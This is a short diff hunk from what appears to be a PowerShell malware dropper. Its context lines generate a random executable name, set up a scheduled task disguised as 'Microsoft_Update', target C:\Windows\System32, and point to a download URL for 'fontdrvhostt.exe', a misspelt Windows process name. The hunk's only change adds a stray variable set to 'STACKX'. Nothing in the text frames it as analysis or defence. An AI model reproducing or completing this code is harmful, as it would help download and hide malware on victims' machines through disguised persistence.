@@ -105,6 +105,7 @@ $r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
 $fileName = "$p_rand$m_rand`_$r_rand.exe"
 $taskName = "Microsoft_Update_$r_rand"
 $destPath = "C:\Windows\System32\$fileName"
+$destPathh = "STACKX"
 $exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"
 
 while ($true) {
